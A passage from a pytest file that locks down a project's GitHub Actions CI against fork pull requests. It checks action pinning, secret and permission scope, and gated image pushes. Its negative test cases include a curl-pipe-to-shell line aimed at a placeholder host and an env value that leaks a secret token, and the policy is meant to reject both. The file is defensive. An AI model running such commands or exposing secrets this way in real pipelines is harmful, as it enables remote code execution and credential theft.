# regex, the exclusion and the round-robin below are the shell half of that
# contract, and the assertions further down fail the moment the two disagree.
#
# `tests/test_*.py`, the pathspec this shard started with, was NOT what pytest
# collects: pytest's `python_files` default is `test_*.py` *and* `*_test.py` at
# any depth, so `tests/foo_test.py` or `tests/unit/test_x.py` would have run in
# no shard at all while `ci-ok` stayed green.
_SHARD_DISCOVERY = (
    "mapfile -t shard_files < <(\n"
    "  git ls-files -- '*.py' |\n"
    "    grep -E '(^|/)(test_[^/]*|[^/]*_test)\\.py$' |\n"
    "    # A CTest fixture, not a pytest module: CMakeLists.txt runs it as\n"
    "    # `python perception_wire_cross_language_test.py <binary>`. It\n"
    "    # matches pytest's default glob but defines no test function, so\n"
    "    # pytest collects zero tests from it.\n"
    "    grep -vxF "
    "'worker/native/deepstream/src/"
    "perception_wire_cross_language_test.py' |\n"
    "    LC_ALL=C sort |\n"
    '    awk -v shard="$SHARD" -v total="$SHARD_TOTAL" \\\n'
    "      'NR % total == shard % total'\n"
    ")\n"
)


# The whole cost centre: pytest was 18m27s of a 19m37s run. fonts-noto-cjk
# provisions the same real CJK glyph file the runtime image installs
# (Dockerfile.edge); it is a plain distro apt package that fetches no other
# repository, reads no secret, starts no container and re-checks out nothing, so
# it stays admissible under this closed-world contract.
#
# The marker filter is byte-for-byte what it has always been. Sharding is a
# deterministic round-robin over the sorted *tracked* test files, which is why
# it adds no dependency to uv.lock -- pytest-split or pytest-xdist would each
# add one, and a new PyPI dependency resolved at CI time in an untrusted
# workflow is exactly the supply-chain surface this file exists to bound. If a
# shard ever collects nothing the step fails loudly rather than passing empty.
_TEST_STEPS = [
    _CHECKOUT_STEP,
    _SETUP_UV_STEP,
    {
        "name": "Install FFmpeg and packaged CJK overlay font",
        "run": (
            "sudo apt-get update && "
            "sudo apt-get install -y --no-install-recommends "
            "ffmpeg fonts-noto-cjk"
        ),
    },
    {"run": "uv sync --frozen --group lint"},
    {
        "name": "Fetch packaged default LSTM model",
        "run": "bash scripts/fetch-models.sh",
    },
    {
        "name": "Run test shard ${{ matrix.shard }} of 4",
        # The matrix value is passed through `env:` and read back as `$SHARD`.
        # Interpolating `${{ matrix.shard }}` into the script body splices
        # expression text into the shell source before bash parses it; `$SHARD`
        # is a value the shell reads, never source it compiles.
        "env": {"SHARD": "${{ matrix.shard }}"},
        "run": _SHARD_DISCOVERY + (
            'if [ "${#shard_files[@]}" -eq 0 ]; then\n'
            '  echo "shard $SHARD collected no test files" >&2\n'
            "  exit 1\n"
            "fi\n"
            'echo "shard $SHARD/$SHARD_TOTAL: ${#shard_files[@]} files"\n'
            'uv run pytest -q -m '
            '"not real_stack and not heavy and not integration" \\\n'
            '  "${shard_files[@]}"\n'
        ),
    },
]

# Branch protection points at this one job. `needs` alone is not enough under
# `if: always()`: a skipped or cancelled dependency would let it pass, so every
# dependency's result is asserted explicitly.
_CI_OK_STEPS = [
    {
        "name": "Assert every required job succeeded",
        "run": (
            "failed=0\n"
            "for entry in \\\n"
            '  "secrets=${{ needs.secrets.result }}" \\\n'
            '  "lint=${{ needs.lint.result }}" \\\n'
            '  "test=${{ needs.test.result }}"; do\n'
            '  name="${entry%%=*}"\n'
            '  result="${entry#*=}"\n'
            '  echo "$name: $result"\n'
            '  if [ "$result" != "success" ]; then\n'
            "    failed=1\n"
            "  fi\n"
            "done\n"
            'exit "$failed"\n'
        ),
    },
]

# Every job carries `timeout-minutes`. Without it a job inherits GitHub's
# 6-hour default, so one wedged step burns a runner for six hours and, on a PR,
# holds the required `ci-ok` check pending for just as long. The budgets are
# sized to the work: `secrets` and `ci-ok` do seconds of work, `lint` a few
# minutes, and a shard about five.
_EXPECTED_JOBS: dict[str, dict[str, object]] = {
    "secrets": {
        "runs-on": "ubuntu-latest",
        "timeout-minutes": "10",
        "steps": _SECRETS_STEPS,
    },
    "lint": {
        "runs-on": "ubuntu-latest",
        "timeout-minutes": "15",
        "steps": _LINT_STEPS,
    },
    "test": {
        "runs-on": "ubuntu-latest",
        "timeout-minutes": "30",
        "strategy": {
            # One shard's failure must not hide the other shards' results.
            "fail-fast": "false",
            "matrix": {"shard": ["1", "2", "3", "4"]},
        },
        "env": {"SHARD_TOTAL": "4"},
        "steps": _TEST_STEPS,
    },
    "ci-ok": {
        "runs-on": "ubuntu-latest",
        "timeout-minutes": "5",
        "needs": ["secrets", "lint", "test"],
        "if": "always()",
        "steps": _CI_OK_STEPS,
    },
}


def _assert_untrusted_ci_security(workflow: dict[str, object]) -> None:
    # `concurrency` is the only top-level key added to the original
    # {jobs, name, on, permissions} set; anything else (env, defaults, a
    # workflow-level secret) still fails here.
    assert set(workflow) == {"concurrency", "jobs", "name", "on", "permissions"}

    # `push` is branch-filtered to main so a PR stops running this workflow
    # twice (once for push, once for pull_request) on the identical commit.
    assert workflow["on"] == {
        "pull_request": "",
        "push": {"branches": ["main"]},
    }
    assert workflow["permissions"] == {"contents": "read"}

    # Superseded PR runs are cancelled; main runs are never cancelled, so the
    # default branch keeps an unbroken status history.
    assert workflow["concurrency"] == {
        "group": "ci-${{ github.workflow }}-${{ github.ref }}",
        "cancel-in-progress": "${{ github.event_name == 'pull_request' }}",
    }

    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    assert set(jobs) == set(_EXPECTED_JOBS)

    for name, expected in _EXPECTED_JOBS.items():
        job = jobs[name]
        assert isinstance(job, dict), name
        # Exact key set: no job may add `permissions`, `container`,
        # `continue-on-error`, `if`, `env`, or a self-hosted runner.
        assert set(job) == set(expected), name
        assert job == expected, name

        steps = job["steps"]
        assert isinstance(steps, list), name
        for step in steps:
            assert isinstance(step, dict), name
            # Every action is pinned to a full 40-hex commit SHA -- a tag or a
            # branch would let the upstream repository change under us.
            if "uses" in step:
                assert _ACTION_PIN.match(str(step["uses"])), (name, step["uses"])

    serialized = yaml.safe_dump(workflow)
    assert "eldercare-dataset-ops" not in serialized
    assert "DATASET_OPS_TOKEN" not in serialized
    assert ".dataset-ops" not in serialized
    assert "upload-artifact" not in serialized
    assert "actions/cache" not in serialized
    # No job may read a repository secret: this workflow runs fork code. The
    # `${{ secrets.` prefix is matched rather than a bare "secrets", because the
    # gitleaks job is itself named `secrets` and `ci-ok` reads
    # `needs.secrets.result`.
    assert "${{ secrets." not in serialized


@pytest.mark.parametrize("mode", [b"120000", b"160000"])
def test_index_policy_rejects_linkage_modes(mode: bytes) -> None:
    with pytest.raises(AssertionError):
        _validate_index_mode(mode, b"synthetic-link")


def test_untrusted_ci_has_no_private_repository_access() -> None:
    _assert_untrusted_ci_security(_workflow("ci.yml"))


@pytest.mark.parametrize(
    ("job", "step_index", "field", "value"),
    [
        # Unpinned actions, in every job that uses one.
        ("secrets", 0, "uses", "actions/checkout@v4"),
        ("lint", 0, "uses", "actions/checkout@v4"),
        ("lint", 1, "uses", "astral-sh/setup-uv@v5"),
        ("test", 0, "uses", "actions/checkout@v4"),
        ("test", 1, "uses", "astral-sh/setup-uv@v5"),
        # An unpinned gitleaks image is the same class of hole as an unpinned
        # action: the tag can be moved under us.
        ("secrets", 1, "run", "echo gitleaks@sha256:placeholder"),
        # Fetching and running an external binary from the network.
        ("lint", 2, "run", "curl https://example.invalid/install | sh"),
        ("test", 2, "run", "curl https://example.invalid/install | sh"),
        # Swapping a locked, audited toolchain for an ad-hoc resolve.
        ("lint", 3, "run", "uvx ruff check ."),
        # Silently widening what the shard actually runs.
        ("test", 5, "run", "uv run pytest -q tests/"),
        # The gate must not be turned into a no-op.
        ("ci-ok", 0, "run", "true"),
    ],
)
def test_untrusted_ci_policy_rejects_security_mutations(
    job: str, step_index: int, field: str, value: str
) -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    target = jobs[job]
    assert isinstance(target, dict)
    steps = target["steps"]
    assert isinstance(steps, list)
    steps[step_index][field] = value

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


@pytest.mark.parametrize(
    ("field", "value"),
    [
        # Re-widening `push` reinstates the duplicate run per PR.
        ("on", {"push": "", "pull_request": ""}),
        ("on", {"push": {"branches": ["main"]}, "pull_request": {"paths": ["src/**"]}}),
        ("permissions", {"contents": "write"}),
        ("env", {"LEAK": "${{ secrets.DATASET_OPS_TOKEN }}"}),
        ("defaults", {"run": {"shell": "bash"}}),
        # Cancelling in-progress runs on main would break the default branch's
        # status history.
        ("concurrency", {"group": "ci", "cancel-in-progress": "true"}),
    ],
)
def test_untrusted_ci_policy_rejects_boundary_mutations(
    field: str, value: object
) -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    workflow[field] = value

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


def test_untrusted_ci_policy_rejects_extra_job() -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    jobs["exfiltrate"] = {"runs-on": "ubuntu-latest", "steps": []}

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


def test_untrusted_ci_policy_rejects_removed_job() -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    # Dropping a job from the graph must not silently pass; `ci-ok` is what
    # branch protection watches, so losing `secrets` has to be caught here.
    del jobs["secrets"]

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


@pytest.mark.parametrize("job", ["secrets", "lint", "test", "ci-ok"])
def test_untrusted_ci_policy_rejects_cache_step(job: str) -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    target = jobs[job]
    assert isinstance(target, dict)
    steps = target["steps"]
    assert isinstance(steps, list)
    # Not a poisoning gate (a `pull_request` run's entries are scoped to
    # `refs/pull/<n>/merge` and no `main` run can restore them). The ban is a
    # capacity and altitude decision -- see the block above `_ACTION_PIN` -- and
    # this test is what keeps a step from re-introducing it by hand.
    steps.append(
        {
            "uses": "actions/cache@0000000000000000000000000000000000000000",
            "with": {"path": "models", "key": "models-pinned-revision"},
        }
    )

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


def test_untrusted_ci_policy_rejects_uv_cache_opt_in() -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    lint = jobs["lint"]
    assert isinstance(lint, dict)
    steps = lint["steps"]
    assert isinstance(steps, list)
    # setup-uv's own cache is the same Actions cache backend as actions/cache.
    steps[1]["with"]["enable-cache"] = "true"

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("continue-on-error", "true"),
        ("if", "false"),
        ("runs-on", "self-hosted"),
        ("env", {"LEAK": "${{ secrets.DATASET_OPS_TOKEN }}"}),
        ("permissions", {"contents": "write"}),
        ("container", "ghcr.io/example/untrusted:latest"),
    ],
)
def test_untrusted_ci_policy_rejects_job_mutations(
    field: str, value: object
) -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    job = jobs["test"]
    assert isinstance(job, dict)
    job[field] = value

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


def test_untrusted_ci_policy_rejects_shard_matrix_change() -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    job = jobs["test"]
    assert isinstance(job, dict)
    strategy = job["strategy"]
    assert isinstance(strategy, dict)
    # The shard count in the matrix and the `SHARD_TOTAL` the step partitions
    # by must move together, or shards silently stop covering the whole suite.
    strategy["matrix"] = {"shard": ["1", "2"]}

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


# ---------------------------------------------------------------------------
# Closed-world policy for EVERY workflow `pull_request` can trigger.
#
# `_assert_untrusted_ci_security` above pins ci.yml step by step, but ci.yml is
# not the only workflow a fork-authored commit starts. edge-images.yml also runs
# `on: pull_request` -- it is the repository's second required status check, it
# builds a PR's own Dockerfiles, and on the publishing paths it holds
# `packages: write` and logs in to ghcr.io. The assertions below therefore apply
# to whatever set of workflows actually carries that trigger. The set is
# *discovered* from the tracked tree rather than listed, so a workflow that
# grows an `on: pull_request` later is covered the moment it is committed, not
# the day somebody remembers to add it here.
# ---------------------------------------------------------------------------

_WORKFLOW_DIR = Path(".github/workflows")

#: The `if:` that keeps a step off a pull_request run. PUSH_IMAGES is the env
#: var carrying the condition; the two constants below are the only two shapes
#: the gate is allowed to take.
_PUSH_GATE = "env.PUSH_IMAGES == 'true'"
_PUSH_GATE_EXPR = "${{ env.PUSH_IMAGES == 'true' }}"
_CACHE_GATE_PREFIX = "${{ env.PUSH_IMAGES == 'true' && "
_CACHE_GATE_SUFFIX = " || '' }}"
#: ...and this is what makes PUSH_IMAGES mean "not a pull request" at all.
_NOT_A_PULL_REQUEST = "${{ github.event_name != 'pull_request' }}"
_NOT_A_PULL_REQUEST_IF = "github.event_name != 'pull_request'"

#: Shell markers for a step that writes to the container registry without a
#: `push:` input. Per-image release isolation adds a tag to an already-published
#: manifest instead of rebuilding it; that is a registry write and needs the
#: same gate as a push.
_REGISTRY_WRITE_MARKERS = ("imagetools create", "edge_image_plan.py retag", "docker push")

#: Dockerfile.edge's CI-only stage. The fresh-build boot smoke is a
#: `docker/build-push-action` step like the two publishing builds, but it is NOT
#: a token consumer and must never become one: it builds a stage that is never
#: shipped, so its `push:` is the literal string "false" rather than the
#: PUSH_IMAGES gate, and it exports nothing at all.
_BOOT_SMOKE_TARGET = "bootsmoke"
_NEVER_PUSHES = "false"

#: The stage Dockerfile.edge actually ships. It is NOT that file's last stage --
#: `bootsmoke` is -- and Docker's default target is the last stage, so a build
#: of Dockerfile.edge that omits `target:` publishes the CI-only smoke layer as
#: the production image. Any step here that can push must therefore name it.
_SHIPPED_TARGET = "runtime"
_EDGE_DOCKERFILE = "Dockerfile.edge"

#: The two mutually exclusive boot-smoke shapes. A freshly built non-release
#: image is smoked in the `bootsmoke` build stage; a reused or release digest is
#: pulled and run. Their `if:` expressions must stay exact complements, or a run
#: could skip both and the required check would pass having booted nothing.
_SMOKE_STAGE_IF = "env.BUILD_ML_WORKER == 'true' && env.RELEASE_BUILD != 'true'"
_SMOKE_PULL_IF = "env.BUILD_ML_WORKER != 'true' || env.RELEASE_BUILD == 'true'"

#: The only (workflow, job) pair permitted to hold a write scope while its
#: workflow is reachable from `pull_request`, and the exact scopes it may hold.
#: `permissions:` accepts no expression (GitHub community discussion #53915) and
#: this job is the required `Build edge ML images + boot smoke` check, so it
#: cannot be hidden behind an `if:` either -- a skipped job is scored as green by
#: branch protection, which would turn the gate into a silent pass. The grant is
#: therefore bounded on the token's consumers instead, which is what
#: `_assert_token_consumers_are_gated` checks.
_WRITE_PERMISSION_HOLDERS: dict[tuple[str, str], set[str]] = {
    ("edge-images.yml", "publish"): {"packages"},
}


def _tracked_workflows() -> dict[str, dict[str, object]]:
    workflows: dict[str, dict[str, object]] = {}
    for relative, blob in _index_blobs():
        if relative.parent != _WORKFLOW_DIR or relative.suffix not in {".yml", ".yaml"}:
            continue
        loaded = yaml.load(blob, Loader=yaml.BaseLoader)
        assert isinstance(loaded, dict), relative
        workflows[relative.name] = loaded
    assert workflows, "no tracked workflow was discovered -- the walk is broken"
    return workflows


def _trigger_names(workflow: dict[str, object]) -> set[str]:
    # BaseLoader keeps the key as the string "on"; it resolves no YAML 1.1 bools.
    triggers = workflow["on"]
    if isinstance(triggers, dict):
        return set(triggers)
    if isinstance(triggers, list):
        return {str(item) for item in triggers}
    return {str(triggers)}


def _pull_request_workflows() -> dict[str, dict[str, object]]:
    found = {
        name: workflow
        for name, workflow in _tracked_workflows().items()
        if "pull_request" in _trigger_names(workflow)
    }
    # Discovery must never quietly come back empty. Both required status checks
    # run on `pull_request`, so if either is missing here the walk broke -- the
    # exposure did not go away.
    assert {"ci.yml", "edge-images.yml"} <= set(found), sorted(found)
    return found


def _jobs(workflow: dict[str, object]) -> dict[str, dict[str, object]]:
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    for name, job in jobs.items():
        assert isinstance(job, dict), name
    return jobs


def _steps(job: dict[str, object]) -> list[dict[str, object]]:
    steps = job.get("steps", [])
    assert isinstance(steps, list)
    for step in steps:
        assert isinstance(step, dict)
    return steps


def _count_pinned_actions(name: str, workflow: dict[str, object]) -> int:
    """Every `uses:` in a PR-reachable workflow names an immutable commit.

    A tag or a branch is a mutable pointer the upstream owner can move, and this
    workflow runs on a fork's commit with a checkout of this repository on the
    runner.
    """
    pinned = 0
    for job_name, job in _jobs(workflow).items():
        for step in _steps(job):
            if "uses" not in step:
                continue
            pinned += 1
            assert _ACTION_PIN.match(str(step["uses"])), (name, job_name, step["uses"])
    return pinned


def _assert_no_pull_request_secret_access(name: str, workflow: dict[str, object]) -> None:
    """No repository secret is readable on a pull_request run of this workflow.

    A job whose own `if:` excludes pull_request cannot start on one, so it may
    read a secret; everything else -- including the workflow-level keys, which
    apply to every job -- may not.
    """
    top_level = {key: value for key, value in workflow.items() if key != "jobs"}
    assert "${{ secrets." not in yaml.safe_dump(top_level), name
    for job_name, job in _jobs(workflow).items():
        if _NOT_A_PULL_REQUEST_IF in str(job.get("if", "")):
            continue
        assert "${{ secrets." not in yaml.safe_dump(job), (name, job_name)


def _assert_token_consumers_are_gated(
    name: str, job_name: str, job: dict[str, object]
) -> None:
    """Nothing in a write-scoped job can spend the token on a pull_request run."""
    env = job.get("env")
    assert isinstance(env, dict), (name, job_name)
    assert env.get("PUSH_IMAGES") == _NOT_A_PULL_REQUEST, (name, job_name, env)

    logins = uploads = pushes = exports = retags = smokes = 0
    for step in _steps(job):
        uses = str(step.get("uses", ""))
        with_ = step.get("with") or {}
        assert isinstance(with_, dict), (name, step.get("name"))
        if uses.startswith("docker/login-action@"):
            logins += 1
            assert step.get("if") == _PUSH_GATE, (name, step.get("name"), step.get("if"))
        if uses.startswith("actions/upload-artifact@"):
            uploads += 1
            assert step.get("if") == _PUSH_GATE, (name, step.get("name"), step.get("if"))
        if with_.get("target") == _BOOT_SMOKE_TARGET:
            # The fresh-build boot smoke. It builds a stage that is never tagged
            # and never shipped, so it is held to a STRICTER rule than the gate:
            # it may not push on any event, not even a publishing one.
            # `push: "false"` as a literal is the assertion; the PUSH_IMAGES
            # gate would be a regression here, not a fix. It must also stay free
            # of `cache-to` (the mode=max export the builds above document at
            # 413.3s) and of `load:` (the docker-format exporter this step
            # exists to avoid). Retargeting it at `runtime` drops it out of this
            # branch and into the generic `push:` check below, which its literal
            # "false" fails.
            smokes += 1
            assert with_["push"] == _NEVER_PUSHES, (name, step.get("name"), with_["push"])
            assert "cache-to" not in with_, (name, step.get("name"))
            assert "load" not in with_, (name, step.get("name"))
            continue
        if "push" in with_:
            pushes += 1
            assert with_["push"] == _PUSH_GATE_EXPR, (name, step.get("name"), with_["push"])
            # A build that can reach the registry must name the stage it ships.
            # Dockerfile.edge ends with the CI-only `bootsmoke` stage and Docker
            # defaults to the LAST stage, so an unpinned build here would push
            # the smoke layer as the production ml-worker image.
            if with_.get("file") == _EDGE_DOCKERFILE:
                assert with_.get("target") == _SHIPPED_TARGET, (
                    name,
                    step.get("name"),
                    with_.get("target"),
                )
        if "cache-to" in with_:
            exports += 1
            cache_to = str(with_["cache-to"])
            # Not a poisoning gate either (a `pull_request` run's BuildKit cache
            # is scoped to `refs/pull/<n>/merge` and no `main` run can restore
            # it). A PR exports nothing because the export measured 413.3s on
            # push run 33154567502, helps only the NEXT run, and evicts
            # DeepStream blobs from a cache already past its 10 GB limit.
            # Gated, this collapses to the empty string on a PR run.
            assert cache_to.startswith(_CACHE_GATE_PREFIX), (name, step.get("name"), cache_to)
            assert cache_to.endswith(_CACHE_GATE_SUFFIX), (name, step.get("name"), cache_to)
        # Per-image release isolation re-tags an already-published digest rather
        # than rebuilding it. That writes to the registry just as a `push:`
        # does, so it is a token consumer and carries the same gate. It is a
        # `run:` step, so the `with:`-shaped checks above cannot see it.
        if any(marker in str(step.get("run", "")) for marker in _REGISTRY_WRITE_MARKERS):
            retags += 1
            assert _PUSH_GATE in str(step.get("if", "")), (
                name,
                step.get("name"),
                step.get("if"),
            )

    # Non-vacuous: these are the shapes this job contains -- one registry login,
    # one artifact upload, two `push:` inputs, two `cache-to` exports, two
    # digest re-tags, and one boot-smoke build that must never grow into any of
    # them. Deleting a gate cannot pass by deleting its step, and deleting the
    # smoke cannot pass by leaving nothing to check.
    assert (logins, uploads, pushes, exports, retags, smokes) == (1, 1, 2, 2, 2, 1), (
        name,
        job_name,
        (logins, uploads, pushes, exports, retags, smokes),
    )


def _assert_write_permissions_stay_off_the_pull_request_path(
    name: str, workflow: dict[str, object]
) -> None:
    permissions = workflow.get("permissions")
    # Workflow-level permissions apply to every job, including any added later,
    # so no write scope may live there.
    assert isinstance(permissions, dict), (name, permissions)
    assert not [scope for scope, level in permissions.items() if level != "read"], (
        name,
        permissions,
    )

    for job_name, job in _jobs(workflow).items():
        job_permissions = job.get("permissions")
        if job_permissions is None:
            continue
        assert isinstance(job_permissions, dict), (name, job_name)
        writes = {scope for scope, level in job_permissions.items() if level != "read"}
        if not writes:
            continue
        allowed = _WRITE_PERMISSION_HOLDERS.get((name, job_name))
        assert allowed is not None, (name, job_name, writes)
        assert writes == allowed, (name, job_name, writes)
        _assert_token_consumers_are_gated(name, job_name, job)


def test_every_pull_request_workflow_pins_actions_to_a_commit() -> None:
    pinned = sum(
        _count_pinned_actions(name, workflow)
        for name, workflow in _pull_request_workflows().items()
    )
    # ci.yml (5) + edge-images.yml (7, the fresh-build boot smoke now being a
    # pinned `docker/build-push-action` rather than a `run:`). A floor, not an
    # equality: adding a pinned step must not have to touch this number.
    assert pinned >= 12, pinned


def test_no_pull_request_workflow_reads_a_secret() -> None:
    for name, workflow in _pull_request_workflows().items():
        _assert_no_pull_request_secret_access(name, workflow)


def test_pull_request_workflows_grant_no_write_scope_they_can_spend() -> None:
    for name, workflow in _pull_request_workflows().items():
        _assert_write_permissions_stay_off_the_pull_request_path(name, workflow)


#: The publish job's steps, in order, as (step name fragment, `uses` prefix or
#: None for a `run:` step). The tests below address steps by index, and an index
#: that silently points at the wrong step still "passes" -- it just stops
#: testing anything. Pinning the sequence turns a reorder into a failure here
#: instead of into a quiet hole there.
_PUBLISH_STEP_SEQUENCE: tuple[tuple[str, str | None], ...] = (
    ("", "actions/checkout@"),
    ("Resolve deploy SHA", None),
    ("Set up Docker Buildx", "docker/setup-buildx-action@"),
    ("Login to GitHub Container Registry", "docker/login-action@"),
    ("Decide, per image", None),
    ("Build and push ml-api", "docker/build-push-action@"),
    ("Build and push ml-worker", "docker/build-push-action@"),
    # The fresh-build boot smoke: a build of Dockerfile.edge's `bootsmoke`
    # stage, so it is an action step and not a `run:`.
    ("Boot smoke test", "docker/build-push-action@"),
    ("Re-tag the published ml-api", None),
    ("Re-tag the published ml-worker", None),
    ("Resolve the digests", None),
    # ...and its complement, for a reused or release digest, which has to pull
    # the published bytes and therefore stays a `run:`.
    ("Boot smoke test", None),
    ("Write edge image env artifact", None),
    ("Upload edge image refs", "actions/upload-artifact@"),
)


def test_edge_image_publish_step_sequence_is_pinned() -> None:
    steps = _steps(_jobs(_workflow("edge-images.yml"))["publish"])
    assert len(steps) == len(_PUBLISH_STEP_SEQUENCE), len(steps)
    for index, (fragment, uses_prefix) in enumerate(_PUBLISH_STEP_SEQUENCE):
        step = steps[index]
        assert fragment in str(step.get("name", "")), (index, step.get("name"))
        if uses_prefix is None:
            assert "uses" not in step, (index, step.get("uses"))
        else:
            assert str(step.get("uses", "")).startswith(uses_prefix), (index, step.get("uses"))


def test_the_required_edge_image_check_is_never_gated_off() -> None:
    """The gate must report on every pull request.

    Branch protection scores a REQUIRED check that never reports as green, so a
    `paths:` filter on the trigger or an `if:` that can exclude a pull request
    from the publish job would silently disable the gate rather than fail it.
    Per-image isolation therefore decides INSIDE the job -- this test is what
    stops the decision from migrating out to a filter.
    """
    workflow = _workflow("edge-images.yml")
    triggers = workflow["on"]
    assert isinstance(triggers, dict)
    pull_request = triggers["pull_request"]
    # `pull_request:` carries no filters. A `paths:`/`paths-ignore:` key here
    # would stop the required check from reporting on the PRs it filtered out,
    # and branch protection would score that silence as a pass. (BaseLoader
    # renders an empty trigger body as `''`.)
    if isinstance(pull_request, dict):
        assert not {"paths", "paths-ignore"} & set(pull_request), pull_request
    else:
        assert pull_request in ("", None), repr(pull_request)

    condition = str(_jobs(workflow)["publish"].get("if", ""))
    # The only `if:` this job may carry is the prerelease exclusion, which
    # cannot be true on a pull_request run.
    assert "pull_request" not in condition, condition
    assert "prerelease" in condition, condition


def test_edge_image_workflow_is_reachable_from_pull_request() -> None:
    # The premise of everything above: this workflow really does execute a
    # fork's Dockerfiles on `pull_request`, and it really is the job that holds
    # `packages: write`. If either stops being true the assertions above go
    # quiet, so both are pinned here.
    workflow = _workflow("edge-images.yml")
    assert "pull_request" in _trigger_names(workflow)
    publish = _jobs(workflow)["publish"]
    assert publish["permissions"] == {"contents": "read", "packages": "write"}
    assert workflow["permissions"] == {"contents": "read"}


@pytest.mark.parametrize(
    ("workflow_name", "job", "step_index", "value"),
    [
        # A moved tag is a moved commit; both required checks run fork code.
        ("edge-images.yml", "publish", 0, "actions/checkout@v4"),
        ("edge-images.yml", "publish", 2, "docker/setup-buildx-action@v3"),
        ("edge-images.yml", "publish", 3, "docker/login-action@v3"),
        ("edge-images.yml", "publish", 5, "docker/build-push-action@v6"),
        # The fresh-build boot smoke is an action now, so it needs the same pin.
        ("edge-images.yml", "publish", 7, "docker/build-push-action@v6"),
        ("edge-images.yml", "publish", 13, "actions/upload-artifact@v4"),
        # A branch ref is worse: it moves on every upstream push.
        ("edge-images.yml", "publish", 0, "actions/checkout@main"),
        # A 40-char string that is not hex must not pass for a commit.
        ("edge-images.yml", "publish", 0, "actions/checkout@" + "z" * 40),
        ("ci.yml", "lint", 0, "actions/checkout@v4"),
    ],
)
def test_pull_request_pin_policy_rejects_an_unpinned_action(
    workflow_name: str, job: str, step_index: int, value: str
) -> None:
    workflow = copy.deepcopy(_workflow(workflow_name))
    _jobs(workflow)[job]["steps"][step_index]["uses"] = value

    with pytest.raises(AssertionError):
        _count_pinned_actions(workflow_name, workflow)


@pytest.mark.parametrize(
    ("step_index", "cache_to"),
    [
        # Ungated: a fork PR would export into the cross-branch BuildKit cache
        # that later trusted runs on main restore from.
        (5, "type=gha,scope=edge-ml-api,mode=max"),
        (6, "type=gha,scope=edge-ml-worker,mode=max"),
        # Gated on the wrong side of the condition.
        (6, "${{ env.PUSH_IMAGES == 'false' && 'type=gha,mode=max' || '' }}"),
        # Right prefix, but the fallback exports anyway.
        (6, "${{ env.PUSH_IMAGES == 'true' && 'type=gha,mode=max' || 'type=gha' }}"),
        # The boot smoke exports nothing on any event, so even a correctly
        # gated `cache-to` is a regression there.
        (7, "type=gha,scope=edge-ml-worker,mode=max"),
        (7, "${{ env.PUSH_IMAGES == 'true' && 'type=gha,scope=edge-ml-worker,mode=max' || '' }}"),
    ],
)
def test_edge_image_policy_rejects_an_ungated_cache_export(
    step_index: int, cache_to: str
) -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    _jobs(workflow)["publish"]["steps"][step_index]["with"]["cache-to"] = cache_to

    with pytest.raises(AssertionError):
        _assert_write_permissions_stay_off_the_pull_request_path(
            "edge-images.yml", workflow
        )


@pytest.mark.parametrize(
    ("target", "permissions"),
    [
        # Back at the workflow level, where it blankets every job.
        ("workflow", {"contents": "read", "packages": "write"}),
        ("workflow", {"contents": "write"}),
        # Widened past the one scope the publishing job is allowed.
        ("job", {"contents": "write", "packages": "write"}),
        ("job", {"contents": "read", "packages": "write", "id-token": "write"}),
    ],
)
def test_edge_image_policy_rejects_a_widened_permission(
    target: str, permissions: dict[str, str]
) -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    if target == "workflow":
        workflow["permissions"] = permissions
    else:
        _jobs(workflow)["publish"]["permissions"] = permissions

    with pytest.raises(AssertionError):
        _assert_write_permissions_stay_off_the_pull_request_path(
            "edge-images.yml", workflow
        )


def test_edge_image_policy_rejects_a_write_scope_on_a_second_job() -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    _jobs(workflow)["notify"] = {
        "runs-on": "ubuntu-latest",
        "permissions": {"packages": "write"},
        "steps": [],
    }

    with pytest.raises(AssertionError):
        _assert_write_permissions_stay_off_the_pull_request_path(
            "edge-images.yml", workflow
        )


@pytest.mark.parametrize(
    ("step_index", "field", "value"),
    [
        # Logging in to ghcr.io on a PR run is the whole thing the gate stops.
        (3, "if", "always()"),
        # Pushing an image built from a PR's own Dockerfile.
        (5, "push", "true"),
        (6, "push", "true"),
        # Re-tagging a published digest is a registry write with no `push:`
        # input, so it needs the gate just as much as a build does.
        (8, "if", "always()"),
        (9, "if", "env.BUILD_ML_WORKER != 'true'"),
        # An artifact upload on a PR run publishes an unpullable digest.
        (13, "if", "always()"),
        # The boot smoke builds a stage that is never shipped. Pushing it is
        # wrong on every event, so `push: "false"` is a literal -- gaining
        # either `true` or the PUSH_IMAGES gate is a regression.
        (7, "push", "true"),
        (7, "push", _PUSH_GATE_EXPR),
        # Retargeting the smoke at the shipped stage turns a throwaway build
        # back into a build of the published image.
        (7, "target", _SHIPPED_TARGET),
        # `load:` is the docker-format exporter this whole step exists to drop.
        (7, "load", "true"),
        # And the mirror image on the PUBLISHING build: Dockerfile.edge's last
        # stage is `bootsmoke`, so a pushing build that names the wrong stage
        # publishes the CI layer.
        (6, "target", _BOOT_SMOKE_TARGET),
